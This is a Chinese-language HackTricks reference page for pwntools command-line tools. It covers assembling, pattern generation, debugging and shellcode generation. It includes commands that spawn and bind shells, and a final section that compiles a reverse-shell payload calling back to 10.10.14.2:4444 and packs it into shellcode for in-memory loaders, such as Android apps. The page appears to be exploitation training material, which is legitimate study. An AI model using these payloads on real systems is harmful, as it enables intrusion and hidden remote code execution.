# PwnTools

{{#include ../../../banners/hacktricks-training.md}}
```
pip3 install pwntools
```
## Pwn asm

从行或文件获取 **opcodes**.
```
pwn asm "jmp esp"
pwn asm -i <filepath>
```
**可以选择：**

- 输出类型 (raw,hex,string,elf)
- 输出文件上下文 (16,32,64,linux,windows...)
- 避免字节 (new lines, null, a list)
- 选择 encoder、debug shellcode，并使用 gdb 运行输出

## **Pwn checksec**

Checksec 脚本
```
pwn checksec <executable>
```
## Pwn constgrep

## Pwn cyclic

获取一个模式
```
pwn cyclic 3000
pwn cyclic -l faad
```
**可以选择：**

- 使用的字母表（默认 lowercase chars）
- uniq pattern 的长度（默认 4）
- context（16,32,64,linux,windows...）
- 获取偏移量（-l）

## Pwn debug

将 GDB 附加到进程上
```
pwn debug --exec /bin/bash
pwn debug --pid 1234
pwn debug --process bash
```
**可以选择：**

- 按 executable、按 name 或按 pid 上下文 (16,32,64,linux,windows...)
- 要执行的 gdbscript
- sysrootpath

## Pwn disablenx

禁用二进制的 nx
```
pwn disablenx <filepath>
```
## Pwn disasm

反汇编 hex opcodes
```
pwn disasm ffe4
```
**可以选择：**

- context (16,32,64,linux,windows...)
- base addres
- color(default)/no color

## Pwn elfdiff

打印两个文件之间的差异
```
pwn elfdiff <file1> <file2>
```
## Pwn hex

获取十六进制表示
```bash
pwn hex hola #Get hex of "hola" ascii
```
## Pwn phd

获取 hexdump
```
pwn phd <file>
```
**可以选择：**

- 要显示的字节数
- 每行字节数与高亮字节
- 跳过开头的字节数

## Pwn pwnstrip

## Pwn scrable

## Pwn shellcraft

获取 shellcodes
```
pwn shellcraft -l #List shellcodes
pwn shellcraft -l amd #Shellcode with amd in the name
pwn shellcraft -f hex amd64.linux.sh #Create in C and run
pwn shellcraft -r amd64.linux.sh #Run to test. Get shell
pwn shellcraft .r amd64.linux.bindsh 9095 #Bind SH to port
```
**可选择：**

- shellcode 及其参数
- 输出文件
- 输出格式
- debug（attach dbg 到 shellcode）
- before（在代码之前放置 debug trap）
- after（在代码之后）
- avoid using opcodes（默认：不含 null 和换行符）
- 运行 shellcode
- 有色/无色
- 列出 syscalls
- 列出可用的 shellcodes
- 生成 ELF 作为 shared library

## Pwn template

获取一个 python 模板
```
pwn template
```
**可选择：** host, port, user, pass, path and quiet

## Pwn unhex

从 hex 到 string
```
pwn unhex 686f6c61
```
## Pwn 更新

更新 pwntools
```
pwn update
```
## ELF → raw shellcode 打包 (loader_append)

Pwntools 可以将独立的 ELF 转换为单个 raw shellcode blob，自动映射其段并将执行权转移到原始入口点。对于仅内存加载器（例如，Android apps invoking JNI to execute downloaded bytes）这是理想的选择。

典型流程（amd64 示例）

1) 构建一个静态、位置无关的 payload ELF（推荐使用 musl 以提高可移植性）：
```bash
musl-gcc -O3 -s -static -o exploit exploit.c \
-DREV_SHELL_IP="\"10.10.14.2\"" -DREV_SHELL_PORT="\"4444\""
```
2) 使用 pwntools 将 ELF 转换为 shellcode:
```python
# exp2sc.py
from pwn import *
context.clear(arch='amd64')
elf = ELF('./exploit')
sc = asm(shellcraft.loader_append(elf.data, arch='amd64'))
open('sc','wb').write(sc)
print(f"ELF size={len(elf.data)} bytes, shellcode size={len(sc)} bytes")
```
3) 将 sc 传送到内存加载器（例如，通过 HTTP[S]）并在进程内执行。

说明
- loader_append 将原始 ELF 程序嵌入到 shellcode 中，并发出一个小型 loader，mmaps the segments and jumps to the entry。
- 通过 context.clear(arch=...) 明确指定架构。arm64 在 Android 上很常见。
- 保持 payload 的代码位置独立（position-independent），并避免对进程的 ASLR/NX 做出假设。

## 参考

- [Pwntools](https://docs.pwntools.com/en/stable/)
- [CoRPhone – ELF→shellcode pipeline used for Android in-memory execution](https://github.com/0xdevil/corphone)

{{#include ../../../banners/hacktricks-training.md}}
